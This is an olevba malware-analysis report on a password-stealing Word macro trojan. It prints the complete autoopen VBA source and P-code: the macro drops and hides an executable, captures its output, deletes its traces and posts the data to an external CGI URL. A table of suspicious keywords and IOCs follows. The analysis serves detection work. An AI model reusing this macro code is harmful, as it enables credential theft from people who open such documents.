olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-PSW.MSWord.Gogga.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan-PSW.MSWord.Gogga.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function decoding(sym As String) As Byte
decoding = (Asc(Mid$(sym, 1, 1)) - 65) * 16 + (Asc(Mid$(sym, 2, 1)) - 65)
End Function
Public Sub autoopen()
Dim bt As Byte, i As Long, str As String, strt As Single
Dim PostData() As Byte, fn As Integer, ie As Object
On Error Resume Next
str = ActiveDocument.Variables(1)
fn = FreeFile
Open "c:\s.exe" For Binary Access Write As #fn
For i = 1 To 38912 Step 2
bt = decoding(Mid$(str, i, 2))
Put #fn, , bt
Next i
Close #fn
Open "c:\s.bat" For Output As #fn
Print #fn, "c:\s.exe >c:\s.bmp"
Close #fn
Shell "c:\s.bat", vbHide
strt = Timer
Do While Timer < strt + 5
    DoEvents
Loop
msg = ""
Open "c:\s.bmp" For Input As #fn
Do
str = Input(1, #fn)
msg = msg & IIf(str = "&" Or str = "=", "#", str)
Loop Until EOF(fn)
Close #fn
Kill "c:\s.*"
PostData = "master=99sau&job=add&username=goga&comments=" & msg
PostData = StrConv(PostData, vbFromUnicode)
Set ie = CreateObject("InternetExplorer.Application")
ie.Navigate "http://www.gb.ru/cgi-bin/guestbook/gb.cgi", 0, "", _
PostData, "Content-Type: application/x-www-form-urlencoded" & vbCrLf
Do
DoEvents
Loop While True
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Trojan-PSW.MSWord.Gogga.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3664 bytes
' Line #0:
' 	FuncDefn (Public Function decoding(sym As String, id_FFFE As Byte) As Byte)
' Line #1:
' 	Ld sym 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0010 
' 	Mul 
' 	Ld sym 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Add 
' 	St decoding 
' Line #2:
' 	EndFunc 
' Line #3:
' 	FuncDefn (Public Sub autoopen())
' Line #4:
' 	Dim 
' 	VarDefn bt (As Byte)
' 	VarDefn i (As Long)
' 	VarDefn str (As String)
' 	VarDefn strt (As Single)
' Line #5:
' 	Dim 
' 	VarDefn PostData (As Byte)
' 	VarDefn fn (As Integer)
' 	VarDefn ie (As Object)
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Variables 0x0001 
' 	St str 
' Line #8:
' 	Ld Friend 
' 	St fn 
' Line #9:
' 	LitStr 0x0008 "c:\s.exe"
' 	Ld fn 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x9800 0x0000 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #11:
' 	Ld str 
' 	Ld i 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd decoding 0x0001 
' 	St bt 
' Line #12:
' 	Ld fn 
' 	Sharp 
' 	LitDefault 
' 	Ld bt 
' 	PutRec 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	Ld fn 
' 	Sharp 
' 	Close 0x0001 
' Line #15:
' 	LitStr 0x0008 "c:\s.bat"
' 	Ld fn 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #16:
' 	Ld fn 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "c:\s.exe >c:\s.bmp"
' 	PrintItemNL 
' Line #17:
' 	Ld fn 
' 	Sharp 
' 	Close 0x0001 
' Line #18:
' 	LitStr 0x0008 "c:\s.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #19:
' 	Ld Timer 
' 	St strt 
' Line #20:
' 	Ld Timer 
' 	Ld strt 
' 	LitDI2 0x0005 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #21:
' 	ArgsCall DoEvents 0x0000 
' Line #22:
' 	Loop 
' Line #23:
' 	LitStr 0x0000 ""
' 	St msg 
' Line #24:
' 	LitStr 0x0008 "c:\s.bmp"
' 	Ld fn 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #25:
' 	Do 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld fn 
' 	Sharp 
' 	ArgsLd Input$ 0x0002 
' 	St str 
' Line #27:
' 	Ld msg 
' 	Ld str 
' 	LitStr 0x0001 "&"
' 	Eq 
' 	Ld str 
' 	LitStr 0x0001 "="
' 	Eq 
' 	Or 
' 	LitStr 0x0001 "#"
' 	Ld str 
' 	ArgsLd IIf 0x0003 
' 	Concat 
' 	St msg 
' Line #28:
' 	Ld fn 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #29:
' 	Ld fn 
' 	Sharp 
' 	Close 0x0001 
' Line #30:
' 	LitStr 0x0006 "c:\s.*"
' 	ArgsCall Kill 0x0001 
' Line #31:
' 	LitStr 0x002C "master=99sau&job=add&username=goga&comments="
' 	Ld msg 
' 	Concat 
' 	St PostData 
' Line #32:
' 	Ld PostData 
' 	Ld vbFromUnicode 
' 	ArgsLd StrConv 0x0002 
' 	St PostData 
' Line #33:
' 	SetStmt 
' 	LitStr 0x001C "InternetExplorer.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set ie 
' Line #34:
' 	LineCont 0x0004 09 00 00 00
' 	LitStr 0x0029 "http://www.gb.ru/cgi-bin/guestbook/gb.cgi"
' 	LitDI2 0x0000 
' 	LitStr 0x0000 ""
' 	Ld PostData 
' 	LitStr 0x002F "Content-Type: application/x-www-form-urlencoded"
' 	Ld vbCrLf 
' 	Concat 
' 	Ld ie 
' 	ArgsMemCall Navigate 0x0005 
' Line #35:
' 	Do 
' Line #36:
' 	ArgsCall DoEvents 0x0000 
' Line #37:
' 	LitVarSpecial (True)
' 	LoopWhile 
' Line #38:
' 	EndSub 
' Line #39:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.gb.ru/cgi|URL                                          |
|          |-                   |                                             |
|          |bin/guestbook/gb.cgi|                                             |
|IOC       |s.exe               |Executable file name                         |
|IOC       |s.bat               |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

